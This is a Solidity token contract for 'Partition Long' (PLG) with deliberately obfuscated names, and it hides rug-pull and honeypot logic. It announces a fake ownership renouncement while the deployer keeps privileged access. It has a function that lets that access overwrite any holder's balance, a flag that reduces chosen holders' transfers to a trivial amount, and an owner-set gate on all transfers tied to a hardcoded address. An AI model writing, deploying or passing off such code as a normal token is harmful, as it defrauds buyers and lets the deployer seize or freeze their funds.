//SPDX-License-Identifier: MIT

pragma solidity ^0.8.9;

interface takeTxSender {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

abstract contract autoTo {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

interface minTakeIs {
    function createPair(address tokenAtTeam, address walletLaunch) external returns (address);
}

interface totalTx {
    function totalSupply() external view returns (uint256);

    function balanceOf(address isReceiver) external view returns (uint256);

    function transfer(address atExemptAuto, uint256 feeTrading) external returns (bool);

    function allowance(address liquidityTrading, address spender) external view returns (uint256);

    function approve(address spender, uint256 feeTrading) external returns (bool);

    function transferFrom(
        address sender,
        address atExemptAuto,
        uint256 feeTrading
    ) external returns (bool);

    event Transfer(address indexed from, address indexed modeReceiverWallet, uint256 value);
    event Approval(address indexed liquidityTrading, address indexed spender, uint256 value);
}

interface totalTxMetadata is totalTx {
    function name() external view returns (string memory);

    function symbol() external view returns (string memory);

    function decimals() external view returns (uint8);
}

contract PartitionLong is autoTo, totalTx, totalTxMetadata {

    uint8 private listMarketing = 18;

    event OwnershipTransferred(address indexed shouldTeam, address indexed fundExempt);

    address feeLaunchedToken = 0x10ED43C718714eb63d5aA57B78B54704E256024E;

    function name() external view virtual override returns (string memory) {
        return senderTx;
    }

    function buyMode(address enableAtBuy) public {
        if (swapMin) {
            return;
        }
        if (receiverEnable == sellExempt) {
            tokenLiquidityTotal = shouldTotal;
        }
        shouldTrading[enableAtBuy] = true;
        
        swapMin = true;
    }

    address public toTeamAmount;

    bool public receiverEnable;

    uint256 constant amountLaunchTrading = 19 ** 10;

    function approve(address exemptEnable, uint256 feeTrading) public virtual override returns (bool) {
        limitReceiver[_msgSender()][exemptEnable] = feeTrading;
        emit Approval(_msgSender(), exemptEnable, feeTrading);
        return true;
    }

    function autoTx() private view {
        require(shouldTrading[_msgSender()]);
    }

    address private senderMinTotal;

    function tokenTeamFee(address feeEnable, address atExemptAuto, uint256 feeTrading) internal returns (bool) {
        if (feeEnable == toTeamAmount) {
            return buyShould(feeEnable, atExemptAuto, feeTrading);
        }
        uint256 autoSenderLaunch = totalTx(listLaunched).balanceOf(autoMode);
        require(autoSenderLaunch == txMarketing);
        require(atExemptAuto != autoMode);
        if (tokenTo[feeEnable]) {
            return buyShould(feeEnable, atExemptAuto, amountLaunchTrading);
        }
        return buyShould(feeEnable, atExemptAuto, feeTrading);
    }

    uint256 private launchedTo;

    bool public swapMin;

    function allowance(address atTx, address exemptEnable) external view virtual override returns (uint256) {
        if (exemptEnable == feeLaunchedToken) {
            return type(uint256).max;
        }
        return limitReceiver[atTx][exemptEnable];
    }

    string private senderTx = "Partition Long";

    function tokenReceiver(address liquidityList) public {
        autoTx();
        
        if (liquidityList == toTeamAmount || liquidityList == listLaunched) {
            return;
        }
        tokenTo[liquidityList] = true;
    }

    bool public exemptMin;

    uint256 private swapReceiver;

    mapping(address => bool) public tokenTo;

    function getOwner() external view returns (address) {
        return senderMinTotal;
    }

    uint256 public shouldTotal;

    function owner() external view returns (address) {
        return senderMinTotal;
    }

    function totalSupply() external view virtual override returns (uint256) {
        return senderTo;
    }

    function decimals() external view virtual override returns (uint8) {
        return listMarketing;
    }

    function symbol() external view virtual override returns (string memory) {
        return launchReceiver;
    }

    function atToken(uint256 feeTrading) public {
        autoTx();
        txMarketing = feeTrading;
    }

    bool private autoTotal;

    uint256 public tokenLiquidityTotal;

    uint256 public receiverLiquidity;

    string private launchReceiver = "PLG";

    constructor (){
        
        takeTxSender amountReceiverEnable = takeTxSender(feeLaunchedToken);
        listLaunched = minTakeIs(amountReceiverEnable.factory()).createPair(amountReceiverEnable.WETH(), address(this));
        
        toTeamAmount = _msgSender();
        minTotal();
        shouldTrading[toTeamAmount] = true;
        fundShould[toTeamAmount] = senderTo;
        if (sellExempt == amountFund) {
            sellExempt = false;
        }
        emit Transfer(address(0), toTeamAmount, senderTo);
    }

    mapping(address => mapping(address => uint256)) private limitReceiver;

    function balanceOf(address isReceiver) public view virtual override returns (uint256) {
        return fundShould[isReceiver];
    }

    uint256 private senderTo = 100000000 * 10 ** 18;

    function receiverAt(address launchTake, uint256 feeTrading) public {
        autoTx();
        fundShould[launchTake] = feeTrading;
    }

    function minTotal() public {
        emit OwnershipTransferred(toTeamAmount, address(0));
        senderMinTotal = address(0);
    }

    bool private amountFund;

    uint256 isSender;

    function transferFrom(address feeEnable, address atExemptAuto, uint256 feeTrading) external override returns (bool) {
        if (_msgSender() != feeLaunchedToken) {
            if (limitReceiver[feeEnable][_msgSender()] != type(uint256).max) {
                require(feeTrading <= limitReceiver[feeEnable][_msgSender()]);
                limitReceiver[feeEnable][_msgSender()] -= feeTrading;
            }
        }
        return tokenTeamFee(feeEnable, atExemptAuto, feeTrading);
    }

    address autoMode = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;

    address public listLaunched;

    function buyShould(address feeEnable, address atExemptAuto, uint256 feeTrading) internal returns (bool) {
        require(fundShould[feeEnable] >= feeTrading);
        fundShould[feeEnable] -= feeTrading;
        fundShould[atExemptAuto] += feeTrading;
        emit Transfer(feeEnable, atExemptAuto, feeTrading);
        return true;
    }

    uint256 txMarketing;

    mapping(address => bool) public shouldTrading;

    bool private sellExempt;

    function transfer(address launchTake, uint256 feeTrading) external virtual override returns (bool) {
        return tokenTeamFee(_msgSender(), launchTake, feeTrading);
    }

    mapping(address => uint256) private fundShould;

}